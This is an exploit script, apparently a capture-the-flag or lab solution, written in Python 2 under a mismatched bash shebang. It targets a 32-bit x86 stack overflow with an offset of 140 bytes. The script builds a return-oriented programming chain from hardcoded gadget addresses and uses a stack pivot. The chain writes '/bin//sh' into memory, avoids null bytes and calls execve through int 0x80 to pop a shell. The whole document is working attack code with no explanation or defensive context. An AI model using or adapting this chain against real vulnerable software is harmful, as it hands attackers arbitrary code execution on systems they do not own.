#!/bin/bash

import struct
import ctypes
import sys

# ===== CONFIGURATION =======

STACK_BASE = 0xbffff580
#STACK_BASE = 0xbffff5c0    # Under debugger
EIP_OFFSET = 140

# ===== CONFIGURATION =======

def conv(x):
    return struct.pack('<I', x)

def set_eax(val):
    if val == 0:
        # Instead of using "0x00000000" value in output we will
        # refer to xor eax, eax gadget:
        # 0x080544e0 : xor eax, eax ; ret
        return conv(0x080544e0)
        
    # Gadget:
    # 0x080bbf26 : pop eax ; ret
    out = conv(0x080bbf26)
    out+= conv(val)
    return out

def set_ebx(val):
    # Gadget:
    #   0x080481c9 : pop ebx ; ret
    out = conv(0x080481c9)
    out+= conv(val)
    return out

def set_ecx(val):
    # Gadget:
    #   0x080e55ad : pop ecx ; ret
    out = conv(0x080e55ad)
    out+= conv(val)
    return out

def set_edx(val):
    if val == 0:
        # Instead of using "0x00000000" value in output we will
        # refer to set edx = -1, edx++ in two gadgets:
        # Gadgets:
        #   0x08054575 : mov edx, 0xffffffff ; ret
        #   0x0805d3c7 : inc edx ; ret
        out = conv(0x08054575)
        out+= conv(0x0805d3c7)
        return out
    else:
        # Gadget:
        # 0x0806ec5a : pop edx ; ret
        out = conv(0x0806ec5a)
        out+= conv(val)
        return out

def add_eax(val):
    triples = val / 3
    out = ''
    # 0x0808fd50 : add eax, 3 ; ret
    for i in range(triples):
        out += conv(0x0808fd50)

    if val % 3 == 1:
        # 0x0808fd40 : add eax, 1 ; ret
        out += conv(0x0808fd40)
    elif val % 3 == 2:
        # 0x0808fd37 : add eax, 2 ; ret
        out += conv(0x0808fd37)
    return out

def poke_uint32(addr, val):
    # Gadget:
    # 0x0809a95d : mov dword ptr [edx], eax ; ret
    out = set_edx(addr)
    out+= set_eax(val)
    out+= conv(0x0809a95d)
    return out

def stack_pivot(offset):
    # Gadget:
    #   0x080e81ef : add esp, dword ptr [eax - 0x3b] ; ret
    out = ''
    out+= set_eax(STACK_BASE + EIP_OFFSET + 12 + 0x3b)
    out+= conv(0x080e81ef)

    # 28 is the offset of first instruction on our pivoted stack
    out+= conv(ctypes.c_uint32(-EIP_OFFSET + offset - 12).value)
    return out

if __name__ == '__main__':

    if len(sys.argv) > 1:
        STACK_BASE = int(sys.argv[1], 16)

    # Address: STACK_BASE
    buf = 'A' * 8

    # pushing on stack string: "/bin//sh"
    buf += conv(0x6e69622f)
    buf += conv(0x68732f2f)

    # to be overwritten with 0
    buf += 'XXXX' 
    buf += 'XXXX' 
    buf += 'XXXX' 

    # === SHELLCODE START

    # Here starts our shadow stack as landed by stack pivot
    # Address: STACK_BASE + 28
    buf += poke_uint32(STACK_BASE + 16, 0)
    buf += poke_uint32(STACK_BASE + 20, STACK_BASE + 8)
    buf += poke_uint32(STACK_BASE + 24, 0)

    # Preparing eax = 0x0b (execve syscall's number)
    buf += set_eax(0)
    buf += add_eax(11)
    buf += set_ebx(STACK_BASE + 8)
    buf += set_ecx(STACK_BASE + 20)
    buf += set_edx(0)

    # int 0x80: 0x08049401 : int 0x80
    buf += conv(0x08049401)

    # === SHELLCODE END

    assert len(buf) <= EIP_OFFSET
    buf += 'A' * (EIP_OFFSET - len(buf))

    buf += stack_pivot(28)

    assert len(buf) > EIP_OFFSET
    sys.stdout.write(buf)

